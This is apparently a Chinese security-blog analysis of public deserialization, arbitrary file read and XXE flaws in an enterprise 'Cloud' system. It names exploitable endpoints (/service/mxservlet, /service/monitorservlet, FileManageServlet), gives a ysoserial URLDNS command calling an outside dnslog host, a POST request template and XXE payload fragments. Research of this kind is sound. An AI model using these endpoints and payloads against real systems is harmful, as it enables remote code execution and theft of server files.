

# 奇安信攻防社区-某Cloud系统漏洞分析

### 某Cloud系统漏洞分析

最近学习反序列漏洞时，恰好看到某系统官方在安全公告中通告了较多的反序列化漏洞。出于兴趣，尝试对该系统的公开漏洞进行一次个人的浅浅分析。如有不对之处，请各位师傅指正并包涵。

最近学习反序列漏洞时，恰好看到某系统官方在安全公告中通告了较多的反序列化漏洞。出于兴趣，尝试对该系统的公开漏洞进行一次个人的浅浅分析。如有不对之处，请各位师傅指正并包涵。

## 路由分析

使用安装包安装完成站点，将服务端的代码打包使用idea打开。  
先打开web.xml看一下路由信息。这里可以看到在路径中访问/service/\*或/servlet/\*实际上都是同一个应用服务处理的。  
![image.png](assets/1699929342-2f258a92c3e85a7d5ab32428419ff096.jpg)  
调用服务的类完整路径如下所示：  
![image.png](assets/1699929342-cd10c9bdae7431caef3f4e615a05cd81.jpg)  
使用`nc.bs.framework.server`路径名作为关键字，对全局进行搜索。在bin/versionback/目录下的digest.cache中找到jar包与类的映射缓存信息，发现相关类在**fw.jar**包中。  
![image.png](assets/1699929342-0fe089c7a84e35d79c372a03f83de3f7.jpg)  
在idea中通过添加library的方式对**fw.jar**进行反编译，找到InvokerServlet类源码。  
该类中所有的get和post操作都被doAction函数处理。  
![image.png](assets/1699929342-06712345326c856955a25fb722d0524b.jpg)  
通过配置远程调试进行分析，发现pathInfo获得的是/service/\*或/servlet/\*后的路径，例如请求/service/test666就会出现如下情况。  
![image.png](assets/1699929342-411cd49a5b4e069fee97a77a2aec5a98.jpg)  
继续跟进doAction函数，发现该类的主要用作是获取modulName和serviceName并调用对应服务，而doActuin方法获取这两个参数有两种方式：  
1、判断传入的uri中是否以～开头，当以~开头，进入到该分支进行处理，并根据~后的内容给moduleName赋值。  
![image.png](assets/1699929342-a2f8141e0a83318834c0c4756ced90fe.jpg)  
2、判断传入的uri中是否以～开头，当不是~开头，将传入的uri作为serviceName  
![image.png](assets/1699929342-da2f23a844cef409b7833fea05e79256.jpg)  
经过上面的流程处理后，此时moduleName为空，serviceName为uri中service或servlet后的内容。  
完成上述分支后，就会调用`getServiceObject`方法实例化对应服务类。  
![image.png](assets/1699929342-5b9ea5506571f8be16c3e9925eec8cc0.jpg)  
跟进`getServiceObject`方法，发现会根据moduleName是否为空存在两个分支：  
1、当moduleName不为空时，会进入else分支，使用serviceObjMap进行处理并用`:`拼接moduleName和serviceName。因为暂不涉及传入moduleName的情况，就先不深入跟，将注意力放在第二分支上。  
2、当moduleName为空时，直接使用使用NCLocator实例化调用ServerNCLocator的lookup方法。  
![image.png](assets/1699929342-431a3ccd6300c7aa853c130f58611d0d.jpg)  
![image.png](assets/1699929342-b7b385e86a50ee60bc85db61406b6b21.jpg)  
从lookup方法进入findComponent方法根据组件名查询服务类对象。  
![image.png](assets/1699929342-160ef510893250197234a87db0c58bcf.jpg)  
成功获得实例obj对象后，会通过反射调用的方式，调用doAction方法。因此后面找到调用的服务类，会从doAction作为入口。  
![image.png](assets/1699929342-2ed9860a072597d4185ed4ee9268b28c.jpg)

## 寻找反序列化点

用工具对**fw.jar**反编译出java，方便后在idea中按照文件全局搜索关键字（class文件无法直接在idea中按文件进行全局搜索）。使用`readObject`、`ois.readObject`等关键搜索。找到MxServlet.java和MonitorServlet.java等存在疑似注入点。  
![image-20231103180730149](assets/1699929342-efa81ddfc80468d35c636a90ebe3921f.jpg)  
![image-20231103180801244](assets/1699929342-b5e6d22e997fc9a83aa3245c3712af0c.jpg)  
进一步阅读MxServlet.java反编译的源码，看到在doAction方法下，存在对request请求的数据直接使用对象输入流的readObject方法进行反序列化。因为通过ois传入的序列化对象可控，因此在后续自动调用该对象的readObject方法时，就会可能存在一系列的套娃调用的问题。  
![image-20231103180831850](assets/1699929342-5a5b1d142f567395309329a8f250487c.jpg)  
查看MonitorServlet.java源码信息，发现也存在同样的反序列化的问题。序列化的对象数据也是直接从request的请求中获得的。  
![image-20231103180852299](assets/1699929342-35d95daa00ad96a0e049766d00e16384.jpg)  
搜索文件关键字，在modules/uap/META-INF/M\_monitortool50.upm中找到该服务类的组件名称。

```php
<?xml version='1.0' encoding='utf-8'?>
<module>
    <public>
        <component name="mxservlet">
            <implementation>nc.bs.framework.mx.MxServlet</implementation>
        </component> 
        <component name="monitorservlet">
            <implementation>nc.bs.framework.mx.monitor.MonitorServlet</implementation>
        </component> 
    </public>
</module>
```

根据之前的路由规则以及实例化服务类的方式，用组件名称就能构造出可以触发漏洞路径`/service/mxservlet`和`/service/monitorservlet`  
在寻找其他反序列化漏洞时，正好发现一个通告，对通告中的服务类进行查找，尝试复现该漏洞。  
![image.png](assets/1699929342-20da600106a10fceb0fd16481252a5fe.jpg)  
在uapsystemframework.jar源码中发现FileManageServlet类的doAction方法存在与之前类似的反序列化的问题。  
![image.png](assets/1699929342-cd51e9eef43a2590186375aa10cd8235.jpg)  
参照前文可构造漏洞路径`/service/FileManageServlet`，后面需要对以上的触发路径进行验证。

## 反序列化漏洞验证

在利用cc链进行命令执行前，可以使用URLDNS对之前的阅读源码的理解进行验证。

> java -jar ysoserial-all.jar URLDNS "[http://mxtest.97886226fd.ipv6.1433.eu.org."](https://97886226fd.ipv6.1433.eu.org./) >mxtest.bin

之后，构造请求数据包，请求的路径为之前构造出来的路径，以`/service/mxservlet`为例  
将生成的序列化数据直接从文件中粘贴。

```php
POST /service/mxservlet HTTP/1.1
Host: 192.168.126.131:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/data
Cookie: JSESSIONID=AE08AAAA9C9FC99389408FE028A93302.server
Connection: close
```

![image.png](assets/1699929342-f8603c05a72c300bebd0a0caebdb9200.jpg)  
在dnslog中获得请求，证明该路径下确实存在对请求数据包中的对象直接反序列化的问题。  
![image.png](assets/1699929342-e724baa4f8ef03119d81716dc4cf6536.jpg)  
为了对反序列化利用链进行探测，向大家推荐一下Yakit的Fuzztag功能。通过dnslog对可用的利用链进行初步判断。  
![image.png](assets/1699929342-14b47c2fe685ff6f18a6cd5cde37e54f.jpg)  
domain填写个dnslog的域名即可。  
![image.png](assets/1699929342-68d42752c4563ac531824c5979194776.jpg)  
发送数据包后，在dnslog中收到如下信息：  
![image.png](assets/1699929342-f978405dd09e83804209aba9b77ca31b.jpg)  
从获得的信息可知，当前服务器为windows。其中cc31or321、cc41和cb17、cb18是指探测到的cc、cb依赖版本。对比版本号可以很方便的看出，可以使用影响commons-collections3版本的CC1/3/5/6/7链，也可以使用CB183链。  
但是需要注意探测出来的利用链并非均可利用，因为还会受到jdk版本影响。比如，CC1/3链因为在jdk 8u71版本中进行了修复，因此在之后的版中jdk版中无法利用，而CC6链则不受jdk版本影响。  
检查一下该系统中依赖，发现正好有用到commons-collections 3.2.1；commons-beanutils 1.8.0

![image-20231103182759406](assets/1699929342-fd01bedeba8c9079be13322245bfd91d.jpg)

![image.png](assets/1699929342-c146bdb3df605bf02454c3f3fc164996.jpg)  
查找学习资料了解，3.2.2版本后，增加了一个方法FunctorUtils#checkUnsafeSerialization，检查常⻅的危险Transformer类。而4.4.1版本后，则是常用的几个危险Transformer类不再实现Serializable接口。都无法利用它们进行命令执行。  
由于本次环境使用的jdk大于8u71版本，因此先用不受影响的CC6链进行测试。  
使用Yakit生成CC6链的十六进制字节码：  
![image.png](assets/1699929342-3e3cf466396de103c8d4f89dd0b4682f.jpg)  
使用Yakit的Fuzztag十六进制解码功能，对字节码进行处理：  
![image.png](assets/1699929342-1b3b3041640380d469a011dbb44cc521.jpg)  
成功执行命令：  
![image.png](assets/1699929342-894432067ae9c70e4422f597fcc3e5a0.jpg)  
对其他利用利用链进行测试：  
![image.png](assets/1699929342-635b1323781bc3d80924dcabaa737593.jpg)  
使用Yakit的Fuzztag对tomcat body回显链进行遍历测试：  
![image.png](assets/1699929342-7a842a0e8e0faeda63d586df3bfc8379.jpg)  
更多Fuzztag使用技巧可参考官方手册：[Fuzz Tag Playbook](https://www.yaklang.com/docs/newforyak/fuzztag/)

## 文件读取

在漏洞通告中，除了以上反序列化漏洞，还注意到一个任意文件读取漏洞  
![image.png](assets/1699929342-2d96ef369e5c00aaab1ec728599a935d.jpg)  
对modules\\hrpub\\lib\\目录下的pubhrpubtools.jar进行反编译，找到FileServlet类文件，查看源码。先看doAction方法：  
![image.png](assets/1699929342-15f5e21ba8b70085ec7b1450dbca6ff7.jpg)  
跟进performTask方法，发现存在对request请求中的path参数值进行base64解码，并将path带入getFileContent方法中。期间虽然又对文件后缀进行判断，但是仅作为返回包中Content-Type取值依据，并未作限制或者拦截。  
![image.png](assets/1699929342-c555209145af2b521048faaebc57d419.jpg)  
跟进getFileContent方法，发现是非常标准的读文件并返回内容的代码。  
![image.png](assets/1699929342-473ca8353077662621e55aed7da05445.jpg)

![image-20231103181125720](assets/1699929342-803a1adb14af19fd00ff10bcb2775ff3.jpg)  
找到漏洞位置，接着寻找如何触发。搜索发现，FileServlet类的组件名称就是它的完整路径。![image.png](assets/1699929342-2f1ab7d18a073aca785bfeacf66fd172.jpg)

![image.png](assets/1699929342-7ed64cb102917592f6c020de34e4a5f4.jpg)  
尝试构造数据包，漏洞路径还是依据前文中的路由规则构造，service或servlet+组件名称，就可以实列化该服务。  
![image.png](assets/1699929342-fed0346b4157aeaa6ac5fa55724e153f.jpg)![image.png](assets/1699929342-c52b32e1bd1696e66739275317f0190f.jpg)  
使用get或post发送数据都可成功触发。

## XXE注入

XXE即XML外部实体注入，由上面可知，外部实体指的就是DTD外部实体，而造成XXE的原因是在解析XML的时候，对恶意的外部实体进行解析导致可加载恶意外部文件，造成严重危害。  
查找资料时，发现有师傅公开的该系统登录位置存在的xxe漏洞。  
在登录位置抓包：  
![image.png](assets/1699929342-d10f771f184643ac80e30ffaac25cbb7.jpg)·  
![image.png](assets/1699929342-fa151473f8a21ad81239984eec0f2b8e.jpg)  
使用常见的外部实体xxe注入代码测试，发现果然可以执行但是无回显信息。

```php
]><foo>%26test;</foo>
```

![image.png](assets/1699929342-86fc89215f86b32b44c0afbebda8d785.jpg)  
推测可能是xml代码因为缺少部分标签，导致无法回显；尝试对原本登录包中xml代码进行格式化，仿照原本的格式修改xxe注入代码。  
![image-20231103175237627](assets/1699929342-633038c091b1989279109f98bb469908.jpg)  
删除多余无用的代码后，就可以得到一个简洁的可回显payload

```php
]> <rpc transaction="10" method="checkPwd"> <vps> <p>%26test;</p> </vps> </rpc>
```

![image.png](assets/1699929342-bd09b43ad9a8bc860668ae2a62118a6b.jpg)  
因为该漏洞黑盒测试就很好挖到，就简单调试看一下源码学习一下。  
先根据路径信息，在hrss目录下的web.xml获得相关的服务信息。利用完整的类路径找它的jar。  
![image.png](assets/1699929342-060ac13d3109955388fbc4850331ce70.jpg)  
找到dorado5-libs.jar进行反编译，并通过查找关键字，对关键位置下断点进行远程调试。  
最终找到在BaseRPCHandler类初始化方法中调用了父类的初始化方法。  
![image.png](assets/1699929342-65bca0a5993e796abc329b417406a446.jpg)  
它的父类AbstractRPCHandler初始化时又调用了Dom4jXmlBuilder的buildDocument方法对\_xml中传进行来的xml代码进行解析，并未进行任何过滤。而Dom4jXmlBuilder中使用了DocumentBuilder类是JDK自带的类，在该类解析时会读取外部实体内容，因此产生的XXE漏洞是有回显的。  
![image.png](assets/1699929342-f070102d0b421d1eb1fb006c033e3c28.jpg)  
最终，获得从外部实体引入的文件内容，并从返回包中回返。  
![image.png](assets/1699929342-fb5c08bfab3a47af601056bb1e1523ca.jpg)

参考文章及相关工具  
[servlet（http接口）开发](https://blog.csdn.net/guaizang/article/details/105520915)  
[SRC挖洞之SSRF与XXE漏洞的实战案例](https://blog.csdn.net/weixin_39190897/article/details/117426009)  
[ysoserial](https://github.com/frohoff/ysoserial)  
[fupo](https://github.com/novysodope/fupo_for_yonyou)
